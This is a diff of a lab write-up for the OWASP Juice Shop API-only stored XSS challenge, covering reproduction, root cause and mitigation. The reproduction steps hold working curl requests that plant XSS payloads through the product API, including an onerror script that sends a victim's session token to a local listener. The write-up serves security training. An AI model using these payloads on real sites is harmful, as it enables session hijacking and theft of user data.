@@ -5,7 +5,7 @@
 **Category:** Cross Site Scripting (XSS)
 **OWASP mapping:** A03:2021 Injection / XSS
 **Difficulty:** 3 stars
-**Video:** _TODO: add Loom link (max 5 minutes)_
+**Video:** https://www.loom.com/share/60b505abf6594e3cb0141c824086cc3d
 
 ## Table of Contents
 
@@ -18,93 +18,135 @@
 
 ## Overview
 
-The product REST API accepts updates to product fields and stores them without sanitising the input on the server. The web interface sanitises what a user types and does not even offer a product description editor, so the payload cannot be introduced through the UI. It can only be planted by calling the API directly. Once stored, the malicious markup is served to every visitor who opens that product, which makes this a stored (persistent) Cross Site Scripting finding that also demonstrates why client side sanitisation is not a security control.
+The product REST API accepts updates to product fields and stores them without sanitising the input on the server. The web interface sanitises what a user types and offers no editor for the product description, so the payload cannot be introduced through the UI. It can only be planted by calling the API directly. The Juice Shop exposes two API areas, and only the generic one allows writing to a single product. Once stored, the malicious markup is served to every visitor who opens that product, which makes this a stored (persistent) Cross Site Scripting finding that also shows why client side sanitisation is not a security control.
 
 ## Why it is dangerous
 
-Unlike a reflected payload that only affects the person who clicks a crafted link, a stored payload is persisted in the database and executed in the browser of every user who views the affected product. One request by the attacker compromises all future visitors, including administrators. In the context of each victim's session the script can read or exfiltrate the session token, act on the victim's behalf, scrape personal data, or redirect to a phishing page. Because the injection path is the API and bypasses the frontend entirely, any defence that lives only in the client is useless. The wider impact is mass account takeover, theft of personal data at scale, and persistent defacement, all triggered by a single stored entry.
+Unlike a reflected payload that only affects the person who clicks a crafted link, a stored payload is persisted in the database and runs in the browser of every user who views the affected product. One request by the attacker compromises all future visitors, including administrators. In each victim's session the script can read and exfiltrate the session token, act on the victim's behalf, scrape personal data, or redirect to a phishing page. Because the injection path is the API and bypasses the frontend entirely, any defence that lives only in the client is useless. The wider impact is mass account takeover, theft of personal data at scale, and persistent defacement, all triggered by a single stored entry.
 
 ## Reproduction
 
 **Preconditions:**
 
 - Local instance running on `http://localhost:3000`
-- A throwaway test account (register one in the app)
-- The account's Bearer token (see Step 1)
+- A throwaway test account and its Bearer token (see Step 2)
 
-### Step 1: Obtain a Bearer token
+### Step 1: Identify the two API areas
+
+1. Open the browser developer tools with F12 and go to the **Network** tab.
+2. Open a product and reload the page. Two API styles are visible:
+   - `/rest/...` in lower case: hand written endpoints for specific features, such as `/rest/products/search` and `/rest/products/1/reviews`.
+   - `/api/...` with a capitalised model name: the generic CRUD interface to the data models, such as `/api/Products` and `/api/Users`.
+
+The distinction matters: the generic `/api/` area is what allows reading and writing a single product.
+
+![TODO caption: Network tab showing /rest/ and /api/ calls](./img/api-xss-apis.png)
+
+### Step 2: Obtain a Bearer token
 
 1. Register and log in with a throwaway test account in the application.
-2. Capture the token. The quickest way is the browser developer tools console:
-
-   ```js
-   localStorage.getItem('token')
-   ```
-
-   Keep it in a shell variable for the next step (do not commit it anywhere):
+2. Read the token from the developer tools: **Storage** tab, **Local Storage**, entry `token`. Keep it in a shell variable (do not commit it anywhere):
 
    ```bash
    TOKEN="<paste the token here>"
    ```
 
-![TODO caption: reading the Bearer token from localStorage](./img/api-xss-token.png)
+![TODO caption: token read from Local Storage](./img/api-xss-token.png)
 
-### Step 2: Plant the payload through the API
+### Step 3: Confirm the rest area has no single product endpoint
 
-Send a direct API request to update a product description with an HTML payload. This cannot be done through the UI, which is the point of the challenge.
+Reading or writing a single product over `/rest/` fails, which is why this is API-only.
 
 ```bash
-curl -X PUT http://localhost:3000/api/Products/1 \
+curl -i http://localhost:3000/rest/products/1
+```
+
+```bash
+curl -i -X PUT http://localhost:3000/rest/products/1 \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"description":"test"}'
+```
+
+Both return `500 Internal Server Error` with `Unexpected path: /rest/products/1`. The rest area only serves its specific endpoints (search, reviews), not a generic single product route.
+
+![TODO caption: rest returns Unexpected path for a single product](./img/api-xss-rest-fail.png)
+
+### Step 4: Read the product over the generic api
+
+```bash
+curl -i http://localhost:3000/api/Products/1
+```
+
+This returns `200 OK` with the product JSON, including the `description` field. This is the field to be abused.
+
+![TODO caption: api returns the product JSON with 200](./img/api-xss-api-read.png)
+
+### Step 5: Inject the payload and solve the challenge
+
+The description cannot be edited through the UI, so send the payload directly to the generic api with a PUT.
+
+```bash
+curl -i -X PUT http://localhost:3000/api/Products/1 \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
 ```
 
-A successful response returns the updated product JSON, now carrying the injected description.
+The response is `200 OK`. Open the product (search for `apple` and open Apple Juice). The challenge is marked solved and the success banner appears.
 
-![TODO caption: API response showing the stored payload](./img/api-xss-request.png)
+> **Note:** Modern browsers block `javascript:` URLs inside an iframe, so no alert box pops up. The challenge still solves, because the Juice Shop detects the stored payload on the server. To show that injected script really executes, use the impact demo below.
 
-### Step 3: Trigger the stored payload
+![TODO caption: API-only XSS challenge solved banner](./img/api-xss-solved.png)
 
-1. Open the affected product in the browser, for example by searching for it and opening its detail view:
+### Step 6: Demonstrate real impact (local only)
 
-   ```text
-   http://localhost:3000/#/search?q=apple
+This shows why stored XSS matters beyond a popup: the stored script steals the viewer's session token and sends it to a listener. Everything stays on the local machine.
+
+1. Start a listener in a second terminal:
+
+   ```bash
+   python3 -m http.server 8000
    ```
 
-2. When the product detail renders the description, the injected markup executes and an `xss` alert appears. The challenge is marked solved.
+2. Write the payload to a file to avoid shell quoting issues:
 
-![TODO caption: stored payload executing on product view](./img/api-xss-alert.png)
+   ```bash
+   cat > /tmp/payload.json <<'EOF'
+   {"description":"<img src=x onerror=\"fetch('http://localhost:8000/?c='+encodeURIComponent(localStorage.getItem('token')))\">"}
+   EOF
+   ```
 
-**Result:** The payload is stored server side and executes for anyone who views the product. The challenge success notification appears.
+3. Plant it through the api:
 
-### Optional: demonstrate real impact (local only)
+   ```bash
+   curl -X PUT http://localhost:3000/api/Products/1 \
+     -H "Authorization: Bearer $TOKEN" \
+     -H "Content-Type: application/json" \
+     -d @/tmp/payload.json
+   ```
 
-To show why this matters beyond an alert box, replace the payload with one that exfiltrates the session token to a local listener. This stays entirely on your machine.
+4. Open Apple Juice again so its description renders. The `onerror` handler fires and sends the token to the listener. In the listener terminal a request appears:
 
-Start a listener in a second terminal:
+   ```text
+   GET /?c=<the session token> HTTP/1.1
+   ```
 
-```bash
-python3 -m http.server 8000
-```
+The script runs for every visitor who views the product. For a logged in user it steals the session token; for a guest with no token it would still run any other injected code. Do not commit the captured token anywhere.
 
-Plant a payload that sends the victim's token to it:
+![TODO caption: listener log showing the stolen token (token cropped)](./img/api-xss-token-stolen.png)
 
-```text
-<img src=x onerror="fetch('http://localhost:8000/?c='+encodeURIComponent(localStorage.getItem('token')))">
-```
-
-When the product is viewed, the token appears in the listener log. Do not commit the captured token anywhere.
+**Result:** The payload is stored server side and executes for anyone who views the product, and the impact demo shows a session token being exfiltrated.
 
 ## Root cause
 
-Two weaknesses combine. First, the product API writes user supplied field values to the database without server side sanitisation, trusting the frontend to have cleaned the input. Second, the product description is later rendered as raw HTML in the product detail view, using the frontend's trusted HTML binding rather than text binding, so stored markup reaches the DOM and runs. The frontend both performs the only sanitisation and is the only place a normal user can edit, which is why calling the API directly bypasses the control entirely. Sanitisation and output encoding belong on the server and at the render sink, not in the editor the attacker can skip.
+Two weaknesses combine. First, the generic product api writes user supplied field values to the database without server side sanitisation, trusting the frontend to have cleaned the input. Second, the product description is later rendered as raw HTML in the product detail view, using the frontend's trusted HTML binding rather than text binding, so stored markup reaches the DOM and runs. The frontend both performs the only sanitisation and is the only place a normal user can edit, which is why calling the api directly bypasses the control entirely. Sanitisation and output encoding belong on the server and at the render sink, not in the editor the attacker can skip.
 
 ## Mitigation
 
-Validate and sanitise untrusted input on the server when it is written, and encode output for its context when it is rendered. Never rely on the client to sanitise, because the API can always be called directly.
+Validate and sanitise untrusted input on the server when it is written, and encode output for its context when it is rendered. Never rely on the client to sanitise, because the api can always be called directly.
 
-Vulnerable (API stores the value as sent, UI renders it as HTML):
+Vulnerable (api stores the value as sent, UI renders it as HTML):
 
 ```ts
 // write: value stored verbatim
@@ -126,7 +168,7 @@ A good production example of doing this correctly is Shopware 6. Since version 6
 
 **Key takeaways:**
 
-- Sanitise untrusted input on the server at write time and encode output at the render sink. Client side sanitisation is not a security boundary because the API can be called directly.
+- Sanitise untrusted input on the server at write time and encode output at the render sink. Client side sanitisation is not a security boundary because the api can be called directly.
 - Prefer text binding over HTML binding, and add a Content Security Policy as defence in depth.
 
 ## References
